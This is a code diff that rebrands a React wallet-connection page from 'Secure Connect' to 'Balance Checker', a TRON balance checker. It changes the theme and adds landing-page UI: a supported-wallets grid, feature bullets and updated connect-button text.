@@ -22,7 +22,7 @@ export default function HomePage() {
   // Page navigation state
   const [currentPage, setCurrentPage] = useState("landing"); // "landing" | "balances" | "agent"
   const [agentZoneEnabled, setAgentZoneEnabled] = useState(false);
-  const [theme, setTheme] = useState("dark");
+  const [theme, setTheme] = useState("light");
 
   // Existing state
   const [health, setHealth] = useState(null);
@@ -283,16 +283,16 @@ export default function HomePage() {
           relayUrl: "wss://relay.walletconnect.com",
           projectId,
           metadata: {
-            name: "Secure Connect",
-            description: "Check your wallet balances",
+            name: "Balance Checker",
+            description: "Check your TRON wallet balances instantly",
             url: typeof window !== "undefined" ? window.location.origin : "",
             icons: [
               "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect fill='%233b82f6' width='32' height='32' rx='6'/%3E%3Ctext x='16' y='22' font-size='18' font-weight='bold' fill='white' text-anchor='middle' font-family='sans-serif'%3ES%3C/text%3E%3C/svg%3E",
             ],
           },
         },
-        themeMode: "dark",
-        themeVariables: { "--w3m-accent": "#3b82f6", "--w3m-z-index": "99999" },
+        themeMode: "light",
+        themeVariables: { "--w3m-accent": "#16a34a", "--w3m-z-index": "99999" },
         allWallets: "SHOW",
         featuredWalletIds: [
           "225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f",
@@ -693,26 +693,72 @@ export default function HomePage() {
     }
   }
 
+  const SUPPORTED_WALLETS = [
+    { name: "MetaMask", icon: "🦊", cls: "metamask" },
+    { name: "Trust Wallet", icon: "🛡", cls: "trust" },
+    { name: "TronLink", icon: "T", cls: "tronlink" },
+    { name: "TokenPocket", icon: "TP", cls: "tokenpocket" },
+    { name: "SafePal", icon: "S", cls: "safepal" },
+    { name: "Ledger", icon: "L", cls: "ledger" },
+  ];
+
   // Landing Page Component
   if (currentPage === "landing") {
     return (
       <div className="landing-page">
         <div className="landing-content">
-          <h1 className="landing-title">Secure Connect</h1>
-          <p className="landing-subtitle">Check your wallet balances</p>
+          <div className="bc-landing-header">
+            <div className="bc-logo-icon">BC</div>
+            <span className="bc-logo-text">Balance Checker</span>
+          </div>
+
+          <div className="bc-badge">
+            <span className="bc-badge-dot" />
+            TRON Network · Live Balances
+          </div>
+
+          <h1 className="landing-title">Check Any Wallet Balance</h1>
+          <p className="landing-subtitle">
+            Instantly view TRX and USDT balances across MetaMask, Trust Wallet, TronLink and more.
+          </p>
+
           <div className="search-container">
             <input
               type="text"
               className="search-input"
-              placeholder="Enter wallet address or connect wallet"
+              placeholder="Enter TRON wallet address or connect wallet"
               readOnly
             />
             <button
               className="search-button"
               onClick={() => setCurrentPage("balances")}
             >
-              Search
+              Check Balance
             </button>
+          </div>
+
+          <div className="bc-wallets-section">
+            <p className="bc-wallets-label">Supported Wallets</p>
+            <div className="bc-wallets-grid">
+              {SUPPORTED_WALLETS.map((w) => (
+                <div key={w.name} className="bc-wallet-chip">
+                  <div className={`bc-wallet-icon bc-wallet-icon--${w.cls}`}>{w.icon}</div>
+                  <span className="bc-wallet-name">{w.name}</span>
+                </div>
+              ))}
+            </div>
+          </div>
+
+          <div className="bc-features">
+            <div className="bc-feature">
+              <span className="bc-feature-icon">✓</span> Real-time TRX & USDT
+            </div>
+            <div className="bc-feature">
+              <span className="bc-feature-icon">✓</span> Multi-wallet support
+            </div>
+            <div className="bc-feature">
+              <span className="bc-feature-icon">✓</span> Secure & private
+            </div>
           </div>
         </div>
       </div>
@@ -752,8 +798,8 @@ export default function HomePage() {
 
       <header className="secure-header">
         <div className="secure-header-left">
-          <div className="secure-logo">SC</div>
-          <div className="secure-app-title">Secure Connect</div>
+          <div className="secure-logo">BC</div>
+          <div className="secure-app-title">Balance Checker</div>
         </div>
         <div className="secure-header-right">
           <div className="nx-network-pill">
@@ -771,8 +817,11 @@ export default function HomePage() {
               {!(tronAddress || walletAddress) ? (
                 <>
                   <h2 className="balances-title">
-                    Connect your wallet via WalletConnect or TronLink
+                    Connect your wallet to check balances
                   </h2>
+                  <p style={{ textAlign: "center", color: "var(--bc-text-muted)", marginBottom: "8px" }}>
+                    Works with MetaMask, Trust Wallet, TronLink & more via WalletConnect
+                  </p>
                   <div className="connect-buttons">
                     <button className="connect-btn connect-btn-primary" onClick={handleConnectTronLink}>
                       Connect with TronLink
